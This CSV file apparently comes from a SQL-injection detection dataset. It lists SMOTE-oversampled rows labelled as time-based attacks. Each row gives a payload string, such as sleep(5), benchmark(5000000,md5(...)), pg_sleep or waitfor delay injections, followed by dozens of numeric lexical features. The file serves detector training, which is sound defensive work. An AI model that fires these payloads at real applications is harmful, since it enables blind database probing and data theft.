id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000122,attack,time,"1 where 8074  =  8074 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000351,0.015186478539642884,72.03668957850867,24.0,3.4689281697980485,16.0,18.0,30.024459719005776,8.012229859502888,0.2221176935085223,0.2498824051970876,0.4167842614695791,0.111215639824811,0.0,0.006114929751444231,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.006114929751444,0.0,0.0,1.0,2.0,0.0,0.006114929751444231,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000123,attack,time,"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000322,1.0788616553032764,95.94872778686405,28.13553254098058,3.832988892076295,22.271065081961158,29.0,34.542130163922316,10.135532540980579,0.2315345258001773,0.30551364618233345,0.3577195184340327,0.10523230958345647,0.37851084699352633,0.0,2.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.757021693987053,0.0,0.0,1.0,4.0,0.3785108469935264,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000124,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,0.6423639337465232,54.16179461764939,18.763482884804116,3.378781813511613,25.290448654412348,1.236517115195885,20.87134596323704,6.763482884804116,0.4691418765078439,0.023906308361994547,0.38165514374213466,0.12529667138802686,3.236517115195884,0.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,3.5269657696082315,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.7634828848041159,0.0,0.0,0.0,1.236517115195884,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000125,attack,time,select sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000298,0.03177273325630384,54.118291896184815,16.023658379236963,2.6874767742796313,13.988170810381519,1.0118291896184797,29.082804327329367,10.035487568855443,0.25859523646238847,0.018669121627087157,0.5373382432541743,0.18539739865635005,3.0118291896184815,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,5.0118291896184815,1.011829189618481,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9881708103815188,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.988170810381519
SMOTE_000126,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,0.5442073294174292,44.77674774584148,20.553495491682973,3.545491993692346,13.0,10.0,16.0,5.776747745841486,0.29035468651720236,0.22334975885938643,0.3573596141750183,0.1289359404483929,0.0,0.7767477458414861,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,0.0,3.0,0.0,0.7767477458414861,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000127,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.6127703513003938,76.2598249907769,28.14519649981554,4.173484695931052,38.77510899520399,3.1451964998155386,19.903929996310765,14.435589499446614,0.5080244362430744,0.04204592418888581,0.2557488911097595,0.19418074845828032,4.0,0.0,2.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,2.5807859992621536,0.0,0.8548035001844617,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000128,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.04788786520108331,28.089264498574238,14.053558699144546,3.324560333627603,11.035705799429698,0.017852899714849713,8.035705799429696,9.0,0.3928764641771806,0.0005409969610559867,0.2860234268348891,0.3205591120268743,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,2.0,0.0,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.017852899714847936,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.017852899714847492
SMOTE_000129,attack,time,"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000509,0.8856422669006422,91.67459467109677,26.976215986709672,3.6497235952684406,25.674594671096777,18.0,35.0,13.0,0.2800433884725737,0.19635180314384354,0.38179517277969577,0.14180963560388699,3.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,5.0,0.0,0.0,1.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.6745946710967755,0.3254053289032245,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000130,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",nearest_attack_euclidean,R000457,1.5395856995730348,57.15066275686648,21.0,3.657408938521439,24.849337243133522,3.0,19.225994135299718,10.075331378433239,0.4365626052193987,0.052557168483636535,0.3349827652793901,0.1758974610175747,2.0,3.0,0.0,0.0,-2.7755575615628914e-17,0.5376656892166197,0.0,2.5376656892166194,0.0,0.0,0.0,0.5376656892166196,1.0,1.0,0.0,0.0,0.0,0.5376656892166197,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000131,attack,time,"1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000752,0.8161600399885289,87.38218941205528,25.382189412055283,3.747250133007079,22.0,27.0,30.0,8.382189412055284,0.25177531778145035,0.3089969809135981,0.34332997879288685,0.09589772251206471,0.38218941205528423,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.38218941205528445,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000132,attack,time,"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000180,1.0722886337662736,86.63472605425352,19.0,2.8828536971721137,14.0,10.0,46.028938378544595,16.605787675708918,0.16447394049639333,0.11748138606885236,0.5259237064531697,0.1921209669815847,0.0,4.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,7.605787675708919,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000133,attack,time,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""djwo""  =  ""djwo",nearest_attack_euclidean,R000250,0.24212858320885003,133.320536951271,25.0,2.9040973699497896,38.32053695127101,2.0,73.0,20.0,0.28739777810541495,0.015002152039885988,0.5475785494558391,0.15002152039886,0.0,4.0,0.0,0.0,1.0,1.0,0.0,14.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.8931543495763311,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.893154349576331
SMOTE_000134,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft",nearest_attack_euclidean,R000215,1.3710951433255083,89.24524323215844,29.0,3.9573744007506173,30.537737838392076,18.235835131255456,30.084883777687143,10.386786484823766,0.3470520608593068,0.20252352025225745,0.3344574526763763,0.11596696621205942,0.0,3.462262161607922,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.924524323215844,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.5377378383920778,0.0,0.0,0.0,1.462262161607922,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000135,attack,time,"select pg_sleep  (  5  )   and   (  ""pjql"" like ""pjql",nearest_attack_euclidean,R000161,0.08786657023859029,52.58189180772456,20.0,3.5994462420512865,28.0,1.0,16.665513446179645,6.916378361544911,0.5329037065187548,0.01903227523281266,0.31658020908655804,0.13148380916187438,0.0,3.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,2.9163783615449113,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000136,attack,time,"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",nearest_attack_euclidean,R000381,0.30722433361642915,71.49647677045058,25.125880807387354,3.598957816378022,15.0,22.0,27.496476770450585,7.0,0.20987599028660972,0.3078181190870276,0.38436376182594484,0.09794212880041787,0.0,0.1258808073873534,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.874119192612646,0.0,0.0,1.0,1.0,0.0,0.12588080738735344,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000137,attack,time,"select sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000202,0.5696067202071682,45.39437339778787,16.0,2.918540267370766,14.0,1.0,21.9094629123896,8.484910485398267,0.3102423578381778,0.022160168417012682,0.4804199940536412,0.18717747969116827,0.0,3.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.484910485398266,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000138,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000440,0.44986875834113266,82.07456084563249,21.638326414040765,3.140721462728316,31.59581603510192,1.8404183964898078,38.31916320702038,10.319163207020383,0.38379414750526597,0.022726391132784907,0.46783598715424674,0.1256434742077024,1.3191632070203834,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.15958160351019157,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.159581603510192
SMOTE_000139,attack,time,waitfor delay '0:0:5' and   (  '%'  =  ',nearest_attack_euclidean,R000684,0.1493162917327008,40.862531153401875,20.172506230680376,3.6935055698199757,15.460016615147666,3.057502076893459,12.28751038446729,10.057502076893458,0.37748304422949025,0.07486931346160577,0.3005227461535769,0.24712489615532707,5.057502076893458,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0575020768934582,0.9424979231065417,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000140,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft",nearest_attack_euclidean,R000215,0.1482127900006569,79.88641127172619,28.88641127172619,4.025848660139269,30.54564508690475,15.0,25.227177456547626,9.113588728273813,0.38223923998860065,0.18777304982758128,0.31586761454016915,0.11412009564364894,0.0,3.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.056794364136906,0.05679436413690658,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000141,attack,time,1%'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000574,0.5741833586005947,94.77174697059729,22.7516728438921,2.897271019033275,28.0,2.0,50.51672843892099,14.2550185316763,0.2965655564013536,0.021183254028668122,0.5321412722175992,0.1501099173523791,1.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,10.503345687784199,0.7516728438920998,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000142,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000175,0.22694579503644366,57.40256986786945,17.56102794714778,3.085953517960571,22.0,1.0,26.12205589429556,8.280513973573889,0.38382419874322954,0.017446554488328617,0.45455822113109345,0.14417102563734843,3.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.280513973573891,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000143,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000401,0.4890074584844188,64.79267212174386,22.792672121743866,3.480584532374706,19.0,10.0,27.0,8.792672121743866,0.2932546225208814,0.15434453816888494,0.4167302530559894,0.13567058625424436,0.0,0.7926721217438653,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.7926721217438651,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000144,attack,time,"1"" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000252,0.0002166907903809744,72.00008140277578,24.000162805551557,3.5092191175257406,15.000081402775779,18.0,30.0,9.0,0.20833421612599304,0.2499997212233706,0.41666620203895105,0.1249998606116853,0.0,1.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,8.14027757790603e-05,0.9999185972242209,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000145,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R000591,0.21648695646491078,53.23358599927144,19.844276000485706,3.2266689575461784,18.311447999028587,1.9221380002428532,24.077861999757147,8.922138000242853,0.34376758624044107,0.03618805323932896,0.45233174595842796,0.16771261456180198,0.0,3.9221380002428536,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0778619997571467,0.0,0.0,0.0,1.0,0.9221380002428533,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000146,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'gpax'  =  'gpax,nearest_attack_euclidean,R000737,0.10731977235777476,100.12054705071388,24.120547050713885,3.370822108246102,39.12054705071388,2.0,45.0,14.0,0.3907209186366223,0.01997636332338945,0.4494681747762623,0.13983454326372605,4.0,0.0,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.9397264746430567,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.939726474643058
SMOTE_000147,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",nearest_attack_euclidean,R000210,0.33635379659471104,86.55674458126971,28.0,3.6988371253016386,30.0,10.0,35.04539566501577,11.511348916253942,0.3474287819860573,0.11580959399535244,0.40393118853589466,0.1328304354826956,0.0,4.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.511348916253942,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000148,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,0.5366112763507968,55.58427884756681,22.75283654270042,3.9128640490552122,27.0,3.5842788475668073,15.415721152433193,9.584278847566807,0.4857871659466546,0.06440990262125779,0.2774403252671288,0.1723626061649588,2.0,3.5842788475668077,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000149,attack,time,1%' rlike sleep  (  5  )  #,nearest_attack_euclidean,R000254,1.5457121423321576,26.06293222468024,14.062932224680235,3.16684673064155,10.0,2.0,10.0,4.062932224680236,0.38425285593066316,0.07685057118613264,0.38425285593066316,0.154643716952541,0.531466112340118,0.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,2.0,0.531466112340118,0.0,0.0,0.0,0.5314661123401181,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000150,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000428,0.5015051515248974,83.30091745245342,19.98055047147205,2.929963420823821,28.300917452453415,1.6601834904906827,42.0,11.339816509509317,0.33919859704190264,0.019781435556882526,0.504611980440729,0.13640798696048595,1.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.0,0.0,0.0,0.0,1.3398165095093173,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000151,attack,time,1 where 6223  =  6223 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000131,0.06692210787107301,45.09518775054288,19.0,3.450952334174749,14.936541499638079,10.0,16.12691700072384,4.031729250180961,0.33135025519702327,0.22178153819193108,0.3574945652888365,0.08937364132220912,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,2.0317292501809603,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.03172925018096051,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0317292501809603
SMOTE_000152,attack,time,"1""   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000336,0.0837151171229243,85.53844394292248,27.028847253567346,3.4452982049036565,16.0,21.0,37.596138450057175,10.94230549286531,0.187273238689907,0.24579612578050297,0.43900449117506024,0.1279261443545298,0.0,1.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,6.913458239297967,0.028847253567344522,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000153,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000525,0.674744400816889,99.39353657422987,24.91202882989551,3.1613864551094593,25.217594234020897,10.0,49.740753872167176,14.435188468041794,0.2540347676922757,0.1008080025064625,0.4999965034399754,0.14516072636128635,0.0,4.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,8.435188468041796,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2175942340208974,0.7824057659791026,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
